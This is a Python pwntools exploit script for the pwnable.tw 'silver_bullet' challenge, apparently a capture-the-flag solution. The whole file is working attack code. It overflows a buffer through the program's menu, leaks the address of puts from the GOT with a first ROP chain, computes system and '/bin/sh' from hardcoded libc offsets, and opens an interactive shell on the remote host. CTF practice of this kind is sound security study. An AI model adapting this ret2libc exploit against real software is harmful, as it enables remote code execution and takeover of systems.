#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./silver_bullet')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10103)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path], *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

system_offset = -0x24800
bin_sh_offset = 0xf9d4b
puts_got = 0x804afdc
puts_plt = 0x80484a8
esp = 0x08048555
main = 0x8048954


payload = 'A' * 7
payload += p32(puts_plt)
payload += p32(main)
payload += p32(puts_got)


io = start()

io.recv()
io.send("1")

io.recv()
io.send("A"*47)

io.recv()
io.send("2")

io.recv()
io.send("A"*100)

io.recv()
io.send("2")

io.recv()
io.send(payload)

io.recv()
io.send("3")

io.recv()
io.send("3")

io.recvuntil("win !!\n")

leak = unpack(io.recvuntil("\n").rstrip("\n"))
log.info("Puts Leak:" + str(hex(leak)))

payload = "A" * 7
payload += p32(leak+system_offset)
payload += "BBBB"
payload += p32(leak+bin_sh_offset)

io.recv()
io.send("1")

io.recv()
io.send("A"*47)

io.recv()
io.send("2")

io.recv()
io.send("A"*100)

io.recv()
io.send("2")

io.recv()
io.send(payload)

io.recv()
io.send("3")

io.recv()
io.send("3")

io.interactive()